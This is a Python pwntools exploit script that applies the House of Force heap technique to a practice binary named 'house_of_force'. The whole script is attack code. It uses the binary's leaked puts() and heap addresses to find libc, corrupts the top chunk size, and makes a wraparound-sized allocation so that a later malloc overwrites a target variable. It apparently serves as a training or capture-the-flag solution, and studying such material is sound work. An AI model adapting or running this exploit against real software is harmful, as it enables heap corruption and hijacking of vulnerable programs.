#!/usr/bin/python3
from pwn import *

exe = "./house_of_force"
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc

gs = '''
init-pwndbg
c
'''.format(**locals())

def start(argv=[], *a, **kw):
    if args.GDB:
        context.terminal = ["/mnt/c/wsl-terminal/open-wsl.exe", "-e"]
        return gdb.debug([exe] + argv, gdbscript=gs, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Select the "malloc" option, send size & data.
def malloc(size, data):
    io.send(b"1")
    io.sendafter(b"size: ", bytes(str(size), 'utf-8'))
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xffffffffffffffff - x) + y

io = start()
# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================
log.info(f"heap: 0x{heap:X}")
log.info(f"target: 0x{elf.sym.target:x}")

malloc(24, b"A"*24 + p64(0xffffffffffffffff))
distance = delta(heap+0x20, elf.sym.target-0x20)
malloc(distance, b'A')
malloc(1, b'vietd0x')

io.sendline(b'2')
io.sendline(b'3')
io.stream()
# The delta() function finds the "wraparound" distance between two addresses.
# log.info(f"delta between heap & main(): 0x{delta(heap, elf.sym.main):02x}")
# =============================================================================

# io.interactive()
